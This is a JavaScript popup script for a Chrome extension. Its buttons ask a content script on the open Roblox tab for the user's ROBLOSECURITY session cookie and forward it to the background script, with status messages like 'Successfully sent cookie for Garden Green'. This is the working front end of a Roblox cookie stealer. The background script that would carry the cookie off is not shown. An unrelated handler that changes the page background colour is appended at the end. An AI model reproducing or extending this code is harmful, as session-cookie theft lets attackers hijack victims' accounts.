// List of button IDs
const buttonIds = [
    'sendCookieButton',
    'button2',
    'button3',
    'button4',
    'button5',
    'button6',
    'button7'
];

// Wait for DOM to load before trying to access the elements
document.addEventListener('DOMContentLoaded', () => {
    buttonIds.forEach(buttonId => {
        const buttonElement = document.getElementById(buttonId);
        
        if (buttonElement) {  // Ensure the button exists before adding the event listener
            buttonElement.addEventListener('click', () => {
                // Query the active tab to get the currently opened Roblox page
                chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                    // Send a message to the content script to retrieve the ROBLOSECURITY cookie
                    chrome.tabs.sendMessage(tabs[0].id, { action: 'getRobloxCookie' }, (response) => {
                        if (response && response.cookie) {
                            // If the cookie is found, send it to the background script
                            chrome.runtime.sendMessage({ action: 'sendCookie', cookie: response.cookie }, (backgroundResponse) => {
                                const statusElement = document.getElementById('status');
                                
                                if (statusElement) {
                                    switch (buttonId) {
                                        case 'sendCookieButton':
                                            statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Garden Green' : 'Failed to send cookie for Garden Green';
                                            break;
                                        // Add cases for other buttons similarly
                                    }
                                } else {
                                    console.error('Status element not found');
                                }
                            });
                        } else {
                            console.error('Failed to retrieve cookie');
                        }
                    });
                });
            });
        } else {
            console.error(`Button with ID ${buttonId} not found.`);
        }
    });
});

/////
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'changeBackground') {
        document.body.style.backgroundColor = request.color;
        sendResponse({ status: 'success' });
    } else {
        sendResponse({ status: 'failure' });
    }
});

